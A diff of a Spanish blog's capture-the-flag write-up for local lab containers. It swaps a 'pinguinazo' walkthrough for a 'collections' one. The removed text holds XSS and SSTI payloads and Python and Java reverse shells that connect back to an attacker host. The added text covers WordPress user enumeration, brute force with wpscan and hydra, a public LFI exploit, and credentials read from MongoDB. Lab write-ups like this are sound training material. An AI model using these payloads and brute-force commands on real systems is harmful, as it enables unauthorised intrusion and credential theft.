@@ -26,18 +26,18 @@ Para ejecutarlo utilizamos el siguiente comando:
 ```bash
 sudo bash auto_deploy.sh pinguinazo.tar
 ```
-![Image 1](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img1.png)
+![Image 1](https://aanton94.github.io/blog/img/posts/dl/collections/img1.png)
 
 **auto_deploy.sh:** este archivo se encarga de desplegar la máquina mediante docker y, una vez presionamos `ctrl+c`{:.info} pasa a un proceso de borrado, todo automático, sin necesidad de tener conocimientos de docker.
 
-**pinguinazo.tar:** contiene todo el contenido de la máquina docker; es el corazón, donde está la máquina víctima.
+**collections.tar:** contiene todo el contenido de la máquina docker; es el corazón, donde está la máquina víctima.
 
 #### **Reconocimiento**
 Lo primero que realizamos es lanzar un ping contra la IP de la máquina para comprobar que tenemos conectividad.
 ```bash
 ping -c 1 172.17.0.2
 ```
-![Image 2](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img2.png)
+![Image 2](https://aanton94.github.io/blog/img/posts/dl/collections/img2.png)
 
 Podemos observar que el ttl es de 64, por tanto, como norma general podemos afirmas que se trata de una maquina linux.
 Una vez comprobada la conectividad, iniciaremos un escaneo con nmap, para detectar puertos abiertos y lo almacenaremos en un fichero llamado scan, con el siguiente comando:
@@ -53,80 +53,83 @@ nmap -p- --open -sV -sC -sS --min-rate=5000 -vvv -n -Pn 172.17.0.2 -oN scan
 - **-n** --> No hace resolución DNS
 - **-Pn** --> No hace ping
 - **-vvv** --> Muestra en pantalla a medida que encuentra puertos (Verbose)
-![Image 3](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img3.png)
-![Image 4](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img4.png)
+![Image 3](https://aanton94.github.io/blog/img/posts/dl/collections/img3.png)
 
-Vemos que tiene abierto el puerto **5000 (upnp?)**.
+
+Vemos que tiene abiertos los puertos **22 (ssh)**, **80 (http)** y **27017 (mongodb)**.
 
 #### **Explotación**
-Lo primero que observamos al acceder por el puerto 5000 es un formulario de registro.
-![Image 5](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img5.png)
+Lo primero que hacemos es acceder via web por el puerto 80.
+![Image 4](https://aanton94.github.io/blog/img/posts/dl/collections/img4.png)
 
-Si lo rellenamos, vemos que nos muestra un saludo y el nombre que hemos introducido en el primer campo.
-![Image 6](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img6.png)
+Tenemos la pagina de inicio de Apache, pero no detectamos nada destacable.
+Por lo tanto utilizamos gobuster para hacer fuzzing web.
+![Image 5](https://aanton94.github.io/blog/img/posts/dl/collections/img5.png)
 
-Trataremos de averiguar si es vulnerable a ejecución de html injection.
-![Image 7](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img7.png)
+Nos encontramos que tenemos una ruta de wordpress, accedemos a ella y nos encontramos con una web creada en wordpress.
+![Image 6](https://aanton94.github.io/blog/img/posts/dl/collections/img6.png)
 
-En el primer campo introducimos lo siguiente:
-```html
-<script>alert("hackeado")</script>
-```
-Al enviarlo comprobamos que efectivamente es vulnerable.
-![Image 8](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img8.png)
+Dentro de la web no vemos nada destaccable, inspeccionando el codigo fuente de la web encontramos un nombre de dominio **collections.dl**.
+![Image 7](https://aanton94.github.io/blog/img/posts/dl/collections/img7.png)
 
-Ahora comprobaremos si es vulnerable a SSTI (Server Side Template Injection), en el github de [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-ospopenread) encontramos exploit para este tipo de vulnerabilidad.
+Lo añadimos el el fichero /etc/hosts y refrescamos la pagina.
+![Image 8](https://aanton94.github.io/blog/img/posts/dl/collections/img8.png)
 
-```python
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
-```
-![Image 9](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img9.png)
-
-Nos muestra el siguiente mensaje:
-![Image 10](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img10.png)
-
-Ahora intentaremos ponernos en escucha por el puerto 443 con netcat, y mediante un payload modificado del github de **PayloadsAllTheThings**, trataremos de ejecutar una reverse shell
-
-```python
-{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_S REAM);s.connect((\"x.x.x.x\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
-```
-![Image 11](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img11.png)
-
-Recibimos la conexión y vemos que somos es usuario pinguinazo :penguin:
-
-![Image 12](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img12.png)
-
-Ahora trataremos de realizar una escalada de privilegios para poder ser root.
-Para ello, como siempre, lo primero que hacemos es revisar que comando puede ejecutar el usuario actual como sudo.
-![Image 13](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img13.png)
-
-Vemos que podemos ejecutar java con privilegios de root, por tanto, podemos crear un fichero java con una revesrse shell ([https://www.revshells.com/](https://www.revshells.com/)) que podremos ejecutar como root.
-
-```java
-public class shell {
-    public static void main(String[] args) {
-        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/172.17.0.1/4444 0>&1")
-            .redirectErrorStream(true);
-        try {
-            Process p = pb.start();
-            p.waitFor();
-            p.destroy();
-        } catch (Exception e) {}
-    }
-}
-```
-Nos ponemos en escucha con netcat, esta vez por el puerto 4444 y ejecutamos como sudo el fichero java que hemos creado.
+Vemos que la pagina carga mejor pero no detectamos nada destacable, por lo tanto mediante la herramienta WpScan, lanzaremos un escaneo para detectar usuarios y posibles pluguins vulnerables en wordpress.
 ```bash
-sudo java rev_shell.java
+wpscan --url http://collections.dl/wordpress -e u,vp 
 ```
-![Image 14](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img14.png)
+- **u** --> Busqueda de usuarios
+- **vp** --> Enumera los plugins vulnerables
 
-Y recibimos la reverse shell siendo el usuario root.
+![Image 9](https://aanton94.github.io/blog/img/posts/dl/collections/img9.png)
 
-![Image 15](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img15.png)
+Nos encuentra el usuario **chocolate** :chocolate_bar:
+Probamos a realizar fuerza bruta al usuario utilizando el siguiente comando con WpScan y el diccionario Rockyou.
 
-:penguin::penguin: ¡¡¡¡Así que, maquina pinguineada!!!! :penguin::penguin:
+```bash
+wpscan --url http://collections.dl/wordpress --passwords /usr/share/wordlists/rockyou.txt 
+```
+![Image 10](https://aanton94.github.io/blog/img/posts/dl/collections/img10.png)
 
+Y nos encuentra que el password es el mismo que el usuario :angry:
+
+Como ya tenemos usuario y password, accedemos al panel de administracion de Wordpress.
+![Image 11](https://aanton94.github.io/blog/img/posts/dl/collections/img11.png)
+![Image 12](https://aanton94.github.io/blog/img/posts/dl/collections/img12.png)
+
+En el menu, accedemos a los pluguins instalados y vemos que tenemos el plugin Site Editor Version 1.1 instalado.
+Buscamos informacion sobre este plugin y vemos que es vulnerable a LFI (Local File Inclusion), y encontramos un script que permite explotar esta vulnerabilidad, por tanto lo descargamos desde [https://github.com/jessisec/CVE-2018-7422](https://github.com/jessisec/CVE-2018-7422).
+![Image 13](https://aanton94.github.io/blog/img/posts/dl/collections/img13.png)
+
+Lo ejecutamos siguiendo las instrucciones, y conseguimos leer el fichero /etc/passwd.
+![Image 14](https://aanton94.github.io/blog/img/posts/dl/collections/img14.png)
+
+Encontramos los usuarios de sistema **chocolate** y **dbadmin**.
+
+Tratamos de acceder via SSH con el usuario chocolate y la contrasena que encontramos anteriormente, pero no logramos acceder, por lo tanto aplicamos fuerza bruta con hydra a la conexion SSH.
+
+```bash
+hydra 172.17.0.2 ssh -s 22 -l chocolate -P /usr/share/wordlists/rockyou.txt -f -I -t 64 
+```
+![Image 15](https://aanton94.github.io/blog/img/posts/dl/collections/img15.png)
+
+Encontramos la contrasena del usuario **chocolate**, asi que, accedemos via SSH y logramos la conexion.
+![Image 16](https://aanton94.github.io/blog/img/posts/dl/collections/img16.png)
+
+Encontramos el archivo **mongodb-27017.sock** en el directorio /tmp. Tratamos de ejecutar mongodb desde la maquina victima pero no nos permite, como tenia expuesto mongodb por el puerto **27017**, lanzaremos la conexion desde la maquina atacante (tuve que instalar mongodb).
+![Image 17](https://aanton94.github.io/blog/img/posts/dl/collections/img17.png)
+
+Una vez conectados, revismos que bases de datos tenemos, nos llama la atencion la base de datos **accesos**, destro de ella encontramos la coleccion **usuarios** y al leer los datos descubrimos el usuario dbadmin y su password.
+![Image 18](https://aanton94.github.io/blog/img/posts/dl/collections/img18.png)
+
+Accedemos con este usuario por SSH para comprobar si podemos realizar la escalada de privilegios, pero no detectamos nada potencialmente vulnerable.
+![Image 19](https://aanton94.github.io/blog/img/posts/dl/collections/img19.png)
+
+Como no detectamos nada probamos a acceder como root con las diferentes contrasenas que hemos encontrado y logramos acceder con la contrasena del usuario **dbadmin**.
+![Image 20](https://aanton94.github.io/blog/img/posts/dl/collections/img20.png)
+
+¡¡¡¡Así que, hemos conseguido ser `root`{:.success}!!!! 
 
 #### **Eliminación del entorno**
 
